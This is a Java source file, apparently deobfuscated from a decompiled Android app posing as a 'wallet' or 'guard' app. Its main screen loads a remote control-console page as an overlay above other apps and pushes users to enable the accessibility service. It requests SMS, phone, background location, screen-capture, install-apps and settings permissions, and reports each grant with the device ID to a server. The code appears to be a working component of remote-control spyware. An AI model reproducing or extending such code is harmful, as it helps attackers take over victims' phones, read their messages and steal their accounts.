package com.guard.wallet.activity;

import com.guard.wallet.core.AppUtils;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.os.Build;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.Toast;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.PermissionResponseVO;
import com.guard.wallet.service.MediaLiveService;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.GuideDialogUtils;
import com.guard.wallet.utils.ConfigManager;
import com.guard.wallet.utils.SharedPrefsManager;
import com.guard.wallet.view.ConfiguredWebView;
import java.lang.ref.WeakReference;

/**
 * 主 Activity — 应用程序的入口界面。
 *
 * <p>核心职责：
 * <ul>
 *   <li>承载 {@link ConfiguredWebView} 管理面板 WebView，加载后台控制台页面</li>
 *   <li>处理各类权限请求回调（存储、安装应用、悬浮窗、位置、短信、电话、通知等），
 *       并通过 {@link PermissionResponseVO} 将授权结果上报服务端</li>
 *   <li>在无障碍服务未就绪时显示引导页，引导用户开启无障碍</li>
 *   <li>实现双击返回键退出确认机制，避免用户误触退出</li>
 *   <li>窗口类型设置为 {@code TYPE_APPLICATION_OVERLAY}（2038），使界面可悬浮于其他应用之上</li>
 * </ul>
 *
 * <p>原始 vendor 反编译字段映射：
 * <ul>
 *   <li>{@code a} -> {@link #webViewRef}（WebView 弱引用）</li>
 *   <li>{@code b} -> {@link #lastBackPressTime}（上次返回键按下时间戳）</li>
 * </ul>
 */
public class MainActivity extends Activity {

    // ==================== 权限请求码常量 ====================
    /** 存储权限（运行时权限回调） */
    private static final int REQUEST_CODE_STORAGE = 1001;
    /** 安装应用权限（ACTION_MANAGE_UNKNOWN_APP_SOURCES） */
    private static final int REQUEST_CODE_INSTALL_APP = 1002;
    /** 媒体投影权限（屏幕录制/截屏） */
    private static final int REQUEST_CODE_MEDIA_PROJECTION = 1003;
    /** 悬浮窗权限（SYSTEM_ALERT_WINDOW） */
    private static final int REQUEST_CODE_OVERLAY = 1004;
    /** 使用情况访问权限（PACKAGE_USAGE_STATS） */
    private static final int REQUEST_CODE_USAGE_ACCESS = 1006;
    /** 前台位置信息权限 */
    private static final int REQUEST_CODE_FOREGROUND_LOCATION = 1007;
    /** 后台位置信息权限 */
    private static final int REQUEST_CODE_BACKGROUND_LOCATION = 1008;
    /** 自启动权限（厂商特定设置页） */
    private static final int REQUEST_CODE_AUTO_START = 1009;
    /** 电量优化白名单权限（REQUEST_IGNORE_BATTERY_OPTIMIZATIONS） */
    private static final int REQUEST_CODE_BATTERY_OPTIMIZATION = 1010;
    /** 短信权限 */
    private static final int REQUEST_CODE_SMS = 1011;
    /** 电话权限 */
    private static final int REQUEST_CODE_PHONE = 1012;
    /** 通用权限请求（按 code 动态申请） */
    private static final int REQUEST_CODE_PERMISSION_BY_CODE = 1013;
    /** 通知权限 */
    private static final int REQUEST_CODE_NOTIFICATION = 1014;
    /** 设备读写权限（startActivityForResult 方式） */
    private static final int REQUEST_CODE_READ_WRITE = 1015;
    /** 系统设置修改权限（WRITE_SETTINGS） */
    private static final int REQUEST_CODE_SYSTEM_SETTINGS = 1016;

    /** WebView 弱引用，持有管理面板 {@link ConfiguredWebView} 实例 */
    public WeakReference<ConfiguredWebView> webViewRef;
    /** 上次返回键按下的时间戳（毫秒），用于双击退出确认 */
    public Long lastBackPressTime;

    @Override
    public final void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.requestWindowFeature(1);
        this.getWindow().getDecorView().setBackgroundColor(Color.parseColor("#303133"));
        this.getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#303133")));
        ConfiguredWebView webView = new ConfiguredWebView(this.getApplicationContext(), false);
        LinearLayout layout = new LinearLayout(this);
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.width = -1;
        lp.height = -1;
        layout.setBackgroundColor(Color.parseColor("#303133"));
        this.setContentView(layout, lp);
        this.webViewRef = new WeakReference<>(webView);
        WindowManager.LayoutParams childLp = new WindowManager.LayoutParams();
        childLp.width = -1;
        childLp.height = -1;
        layout.addView(this.webViewRef.get(), childLp);
        WindowManager.LayoutParams winAttrs = this.getWindow().getAttributes();
        winAttrs.type = 2038; // TYPE_APPLICATION_OVERLAY — 需要 SYSTEM_ALERT_WINDOW 权限
        this.getWindow().setAttributes(winAttrs);
        this.lastBackPressTime = System.currentTimeMillis();
        GuideDialogUtils.registerCurrentActivity(this);
    }

    @Override
    public final void onResume() {
        super.onResume();
        WeakReference<ConfiguredWebView> ref = this.webViewRef;
        if (ref == null || ref.get() == null) {
            return;
        }
        this.webViewRef.get().onResume();

        // Check if accessibility service is available or adb can write secure settings
        if (MyAccessibilityService.P() == null && !com.guard.wallet.utils.SystemHelper.j()) {
            boolean adbCanWrite;
            synchronized (SharedPrefsManager.class) {
                adbCanWrite = SharedPrefsManager.e("adbCanWriteSecure");
            }
            if (!adbCanWrite) {
                this.webViewRef.get().loadUrl(GuideDialogUtils.getGuidePageUrl());
                this.webViewRef.get().setGuide(true);
                GuideDialogUtils.showAccessibilityEnableDialog();
                return;
            }
        }

        // Check if main URL is already loaded
        if (this.webViewRef.get().getPageFinished()
                && this.webViewRef.get().getUrl() != null
                && this.webViewRef.get().getUrl().startsWith(ConfigManager.getMainUrl())) {
            Log.d("MainActivity", "Main url is load finished");
        } else {
            this.webViewRef.get().loadUrl(ConfigManager.getMainUrl());
            this.webViewRef.get().setGuide(false);
        }
        GuideDialogUtils.dismissGuideDialog();
    }

    @Override
    public final void onPause() {
        super.onPause();
        WeakReference<ConfiguredWebView> ref = this.webViewRef;
        if (ref != null && ref.get() != null) {
            ref.get().onPause();
        }
    }

    @Override
    public final void onStart() {
        super.onStart();
    }

    @Override
    public final void onDestroy() {
        WeakReference<ConfiguredWebView> ref = this.webViewRef;
        if (ref != null && ref.get() != null) {
            ref.get().destroy();
            this.webViewRef = null;
        }
        super.onDestroy();
    }

    @Override
    public final void onDetachedFromWindow() {
        super.onDetachedFromWindow();
    }

    @Override
    public final void onActivityResult(int requestCode, int resultCode, Intent data) {
        String logMsg = null;
        boolean success = false;

        switch (requestCode) {
            case REQUEST_CODE_INSTALL_APP:
                if (resultCode == -1) {
                    logMsg = "安装应用程序申请成功"; success = true;
                } else {
                    logMsg = "安装应用程序申请失败";
                }
                break;
            case REQUEST_CODE_MEDIA_PROJECTION:
                if (Build.VERSION.SDK_INT >= 29) {
                    Intent intent = new Intent(this, MediaLiveService.class);
                    intent.putExtra("code", resultCode);
                    intent.putExtra("data", data);
                    this.startForegroundService(intent);
                } else {
                    com.guard.wallet.capture.ScreenCaptureManager.getInstance().handleProjectionResult(data);
                }
                break;
            case REQUEST_CODE_OVERLAY:
                if (resultCode == -1) {
                    logMsg = "悬浮窗权限申请成功"; success = true;
                } else {
                    logMsg = "悬浮窗权限申请失败";
                }
                break;
            case REQUEST_CODE_USAGE_ACCESS:
                if (resultCode == -1) {
                    logMsg = "使用情况访问权限申请成功"; success = true;
                } else {
                    logMsg = "使用情况访问权限申请失败";
                }
                break;
            case REQUEST_CODE_AUTO_START:
                if (resultCode == -1) {
                    logMsg = "自启动权限申请成功"; success = true;
                } else {
                    logMsg = "自启动权限申请失败";
                }
                break;
            case REQUEST_CODE_BATTERY_OPTIMIZATION:
                if (resultCode == -1) {
                    logMsg = "电量优化白名单权限申请成功"; success = true;
                } else {
                    logMsg = "电量优化白名单权限申请失败";
                }
                break;
            case REQUEST_CODE_PERMISSION_BY_CODE:
                if (resultCode == -1) {
                    logMsg = "REQUEST_PERMISSION_BY_CODE 申请成功"; success = true;
                } else {
                    logMsg = "REQUEST_PERMISSION_BY_CODE 申请失败";
                }
                break;
            case REQUEST_CODE_READ_WRITE:
                if (resultCode == -1) {
                    logMsg = "设备读写权限申请成功"; success = true;
                } else {
                    logMsg = "设备读写权限申请失败";
                }
                break;
            case REQUEST_CODE_SYSTEM_SETTINGS:
                if (resultCode == -1) {
                    logMsg = "设备系统项修改权限申请成功"; success = true;
                } else {
                    logMsg = "设备系统项修改权限申请失败";
                }
                break;
            default:
                super.onActivityResult(requestCode, resultCode, data);
                break;
        }

        if (logMsg != null) {
            if (success) {
                Log.d("MainActivity", logMsg);
            } else {
                Log.e("MainActivity", logMsg);
            }
        }

        // Send permission response
        PermissionResponseVO response = new PermissionResponseVO();
        response.setDeviceId(SharedPrefsManager.l("deviceId"));
        response.setRequestCode(requestCode);
        response.setRequested(1);
        response.setGranted(resultCode == -1 ? 1 : 0);
        MessageRecordVO record = new MessageRecordVO();
        record.setExtraBody(response);
        record.setIntentCode("android.intent.action.GRANT");
        MainApplication.getInstance().getHandlerMsgAndTimer().b(record);
    }

    @Override
    public final void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        String logMsg = null;
        boolean success = false;

        switch (requestCode) {
            case REQUEST_CODE_STORAGE:
                if (grantResults.length > 0 && grantResults[0] == 0) {
                    logMsg = "设备读写权限申请成功"; success = true;
                } else {
                    logMsg = "设备读写权限申请失败";
                }
                break;
            case REQUEST_CODE_FOREGROUND_LOCATION:
                if (grantResults.length > 0 && grantResults[0] == 0) {
                    logMsg = "前台位置信息权限申请成功"; success = true;
                } else {
                    logMsg = "前台位置信息权限申请失败";
                }
                break;
            case REQUEST_CODE_BACKGROUND_LOCATION:
                if (grantResults.length > 0 && grantResults[0] == 0) {
                    logMsg = "后台位置信息权限申请成功"; success = true;
                } else {
                    logMsg = "后台位置信息权限申请失败";
                }
                break;
            case REQUEST_CODE_SMS:
                if (grantResults.length > 0 && grantResults[0] == 0) {
                    logMsg = "短信权限申请成功"; success = true;
                } else {
                    logMsg = "短信权限申请失败";
                }
                break;
            case REQUEST_CODE_PHONE:
                if (grantResults.length > 0 && grantResults[0] == 0) {
                    logMsg = "电话权限申请成功"; success = true;
                } else {
                    logMsg = "电话权限申请失败";
                }
                break;
            case REQUEST_CODE_PERMISSION_BY_CODE:
                if (grantResults.length > 0 && grantResults[0] == 0) {
                    logMsg = "REQUEST_PERMISSION_BY_CODE 申请成功"; success = true;
                } else {
                    logMsg = "REQUEST_PERMISSION_BY_CODE 申请失败";
                }
                break;
            case REQUEST_CODE_NOTIFICATION:
                if (grantResults.length > 0 && grantResults[0] == 0) {
                    logMsg = "通知权限申请成功"; success = true;
                } else {
                    logMsg = "通知权限申请失败";
                }
                break;
            default:
                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                return;
        }

        if (logMsg != null) {
            if (success) {
                Log.d("MainActivity", logMsg);
            } else {
                Log.e("MainActivity", logMsg);
            }
        }

        // Send permission response
        PermissionResponseVO response = new PermissionResponseVO();
        response.setDeviceId(SharedPrefsManager.l("deviceId"));
        response.setRequestCode(requestCode);
        response.setRequested(1);
        response.setGranted(grantResults.length > 0 && grantResults[0] == 0 ? 1 : 0);
        MessageRecordVO record = new MessageRecordVO();
        record.setExtraBody(response);
        record.setIntentCode("android.intent.action.GRANT");
        MainApplication.getInstance().getHandlerMsgAndTimer().b(record);
    }

    @Override
    public final boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == 4 && event.getAction() == 0) {
            WeakReference<ConfiguredWebView> ref = this.webViewRef;
            if (ref != null && ref.get() != null) {
                if (ref.get().guideFlag.get()) {
                    return false;
                }
                if (ref.get().canGoBack()) {
                    ref.get().goBack();
                    return true;
                }
            }

            if (System.currentTimeMillis() - this.lastBackPressTime > 2000L) {
                this.lastBackPressTime = System.currentTimeMillis();
                Integer unused = ConfigManager.DEFAULT_PROMOTION_MODEL;
                String tip;
                if (MainApplication.getInstance() != null
                        && MainApplication.getInstance().getBuildConfig() != null
                        && !AppUtils.B(MainApplication.getInstance().getBuildConfig().getExitConfirm())) {
                    tip = MainApplication.getInstance().getBuildConfig().getExitConfirm();
                } else {
                    tip = "Press again to exit";
                }
                Toast.makeText(this, tip, 0).show();
            } else {
                this.finish();
            }
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
}
